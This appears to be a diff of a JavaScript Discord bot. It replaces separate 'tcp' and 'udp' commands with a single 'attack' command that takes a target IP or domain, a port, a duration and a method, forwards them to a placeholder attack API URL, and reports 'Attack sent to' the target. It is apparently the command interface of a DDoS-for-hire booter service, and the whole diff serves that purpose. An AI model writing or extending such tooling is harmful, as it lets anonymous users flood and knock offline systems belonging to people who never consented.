@@ -40,21 +40,23 @@ client.on('ready', () => {
         .setColor("#FF5733")
         message.channel.send(embed)
     }
-    else if (command === "tcp") {
+    else if (command === "attack") {
         if(!args[0]) return message.channel.send("Please input your target ip address/domain!")
         if(!args[1]) return message.channel.send("Please input port!")
         if(!args[2]) return message.channel.send("Please input attack time!")
+        if(!args[3]) return message.channel.send("Please input the attack method!")
         let ip = args[0]
         let port = args[1]
         let time = args[2]
-        request(`INSERT API URL with ${ip}, ${port}, and ${time}`, { method: "GET" }, function(error) {
+        let method = args[3]
+        request(`INSERT API URL with ${ip}, ${port}, ${time} and ${method}`, { method: "GET" }, function(error) {
             if (error) message.channel.send("Server send an error, maybe down?");
             else {
                 try {
                 let embed = new MessageEmbed()
                 .setColor(`#FF5733`)
                 .setAuthor(`Your command has been requested!"`, "https://cdn.discordapp.com/emojis/727166288614522962.png?v=1")
-                .setDescription(`Attack sent to: \n\nIP Address: ${ip}\nPort: ${port}\nTime: ${time}`)
+                .setDescription(`Attack sent to: \n\nIP Address: ${ip}\nPort: ${port}\nTime: ${time}\nMethod: ${method}`)
                 .setFooter(`Requested by ` + message.author.tag)
                 .setTimestamp() 
                 message.channel.send(embed)  
@@ -64,29 +66,5 @@ client.on('ready', () => {
             }
         });
     }
-    else if (command === "udp") {
-        if(!args[0]) return message.channel.send("Please input your target ip address/domain!")
-        if(!args[1]) return message.channel.send("Please input port!")
-        if(!args[2]) return message.channel.send("Please input attack time!")
-        let ip = args[0]
-        let port = args[1]
-        let time = args[2]
-        request(`INSERT API URL with ${ip}, ${port}, and ${time}`, { method: "GET" }, function(error) {
-            if (error) message.channel.send("Server send an error, maybe down?");
-            else {
-                try {
-                let embed = new MessageEmbed()
-                .setColor(`#FF5733`)
-                .setAuthor(`Your command has been requested!"`, "https://cdn.discordapp.com/emojis/727166288614522962.png?v=1")
-                .setDescription(`Attack sent to: \n\nIP Address: ${ip}\nPort: ${port}\nTime: ${time}`)
-                .setFooter(`Requested by ` + message.author.tag)
-                .setTimestamp() 
-                message.channel.send(embed)  
-                } catch (e) {
-                message.channel.send("Server send an error, maybe not working?")
-                }
-            }
-        });
-    } 
 });
 client.login(config.token);
